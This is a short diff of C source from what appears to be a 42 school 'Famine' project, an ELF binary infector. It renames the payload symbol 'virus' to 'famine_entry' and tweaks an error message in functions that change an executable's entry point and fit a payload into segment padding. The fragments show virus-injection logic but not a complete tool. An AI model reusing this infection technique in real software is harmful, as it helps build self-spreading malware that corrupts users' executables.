@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 07:27:00 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 09:50:37 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,7 +20,7 @@ static bool	change_entry(const struct safe_pointer info,
 {
 	Elf64_Ehdr	*clone_hdr = safe(0, sizeof(Elf64_Ehdr));
 
-	if (!clone_hdr)  return errors(ERR_CORRUPT, "wildly unreasonable");
+	if (!clone_hdr)  return errors(ERR_CORRUPT, "wildly unreasonable\nchange_entry");
 
 	const Elf64_Xword	sh_offset         = endians.endian_8(original_entry->safe_shdr->sh_offset);
 	const size_t		offset_in_section = original_entry->offset_in_section;
@@ -40,7 +40,7 @@ static bool	adjust_sizes(const struct endians_pointer endians,
 	const struct safe_pointer info, size_t shift_amount)
 {
 	struct entry	clone_entry;
-	const size_t	payload_size = _start - virus;
+	const size_t	payload_size = _start - famine_entry;
 
 	if (!find_entry(&clone_entry, info, endians)) return errors(ERR_THROW, "adjust_sizes");
 
@@ -65,7 +65,7 @@ static bool	define_shift_amount(const struct endians_pointer endians,
 	const size_t	p_filesz        = endians.endian_8(original_entry->safe_phdr->p_filesz);
 	const size_t	p_offset        = endians.endian_8(original_entry->safe_phdr->p_offset);
 	const size_t	segment_end     = p_offset + p_filesz;
-	const size_t	payload_size    = _start - virus;
+	const size_t	payload_size    = _start - famine_entry;
 	const size_t	segment_padding = segment_end - original_entry->end_of_last_section;
 
 	if (payload_size < segment_padding)
